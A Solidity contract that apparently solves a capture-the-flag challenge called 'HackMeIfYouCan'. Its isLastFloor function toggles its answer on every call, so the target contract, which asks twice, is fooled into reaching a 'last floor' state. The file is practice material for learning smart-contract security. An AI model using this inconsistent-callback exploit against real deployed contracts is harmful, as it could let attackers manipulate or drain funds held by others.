// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;
import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "../src/HackMeIfYouCan.sol";

contract Building {
    address public hackMeIfYouCan;
    HackMeIfYouCan hackMeContract;
    bool isLastFloorVal = true;

    constructor(address _hackMeIfYouCan) {
        hackMeIfYouCan = _hackMeIfYouCan;
        hackMeContract = HackMeIfYouCan(payable(hackMeIfYouCan));
    }

    function isLastFloor(uint256 _value) external returns (bool) {
        isLastFloorVal = !isLastFloorVal;
        return isLastFloorVal;
    }

    function goToHack(uint256 value) public {
        hackMeContract.goTo(value);
    }
}
